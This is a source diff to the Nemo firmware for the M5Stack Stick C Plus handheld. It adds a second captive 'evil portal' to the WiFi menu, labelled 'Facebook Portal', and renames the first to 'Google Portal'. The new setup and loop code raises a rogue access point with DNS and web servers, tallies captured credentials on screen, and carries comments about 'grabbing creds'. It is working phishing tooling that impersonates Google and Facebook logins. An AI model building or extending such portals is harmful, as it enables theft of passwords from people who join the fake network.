@@ -1,8 +1,12 @@
+// Adding a second portal to the menu - Google Portal and Facebook Portal
+// To-do:  Add a second page after grabbing creds.  Right now, it uses the old getHtmlContents(LOGIN_AFTER_MESSAGE)
+// Facebook Portal was ported from https://github.com/raphntc/Portal-Evil-HUEBR---M5STICK-C-PLUS-/blob/main/portal-evil-huebr/portal-evil-huebr.ino
+
 // Nemo Firmware for the M5 Stack Stick C Plus
 // github.com/n0xa | IG: @4x0nn
 
 // -=-=-=-=-=-=- Uncomment the platform you're building for -=-=-=-=-=-=-
-// #define STICK_C_PLUS
+#define STICK_C_PLUS
 // #define STICK_C_PLUS2
 // #define STICK_C
 // #define CARDPUTER
@@ -1545,7 +1549,8 @@ MENU wsmenu[] = {
   { TXT_WF_SPAM_FUN, 1},
   { TXT_WF_SPAM_RR, 2},
   { TXT_WF_SPAM_RND, 3},
-  { "NEMO Portal", 4},
+  { "Google Portal", 4},
+  { "Facebook Portal", 6},
 };
 int wsmenu_size = sizeof(wsmenu) / sizeof (MENU);
 
@@ -1588,6 +1593,9 @@ void wsmenu_loop() {
         break;
       case 5:
         current_proc = 1;
+        break;
+      case 6:
+        current_proc = 20;
         break;
     }
   }
@@ -1802,6 +1810,16 @@ void portal_setup(){
   delay(500); // Prevent switching after menu loads up
 }
 
+void portal_setup2(){
+  setupWiFi();
+  setupWebServer2();
+  portal_active = true;
+  cursor = 0;
+  rstOverride = true;
+  printHomeToScreen2();
+  delay(500); // Prevent switching after menu loads up
+}
+
 void portal_loop(){
   if ((millis() - lastTick) > PortalTickTimer) {
     lastTick = millis();
@@ -1814,6 +1832,26 @@ void portal_loop(){
   webServer.handleClient();
   if (check_next_press()){
     shutdownWebServer();
+    portal_active = false;
+    rstOverride = false;
+    isSwitching = true;
+    current_proc = 12;
+    delay(500);
+  }
+}
+
+void portal_loop2(){
+  if ((millis() - lastTick) > PortalTickTimer) {
+    lastTick = millis();
+    if (totalCapturedCredentials != previousTotalCapturedCredentials) {
+      previousTotalCapturedCredentials = totalCapturedCredentials;
+      printHomeToScreen2();
+    }
+  }
+  dnsServer.processNextRequest();
+  webServer.handleClient();
+  if (check_next_press()){
+    shutdownWebServer2();
     portal_active = false;
     rstOverride = false;
     isSwitching = true;
@@ -1983,6 +2021,9 @@ void loop() {
       case 19:
         portal_setup();
         break;
+      case 20:
+        portal_setup2();
+        break;
     }
   }
 
@@ -2059,6 +2100,9 @@ void loop() {
       break;
     case 19:
       portal_loop();
+      break;
+    case 20:
+      portal_loop2();
       break;
   }
 }
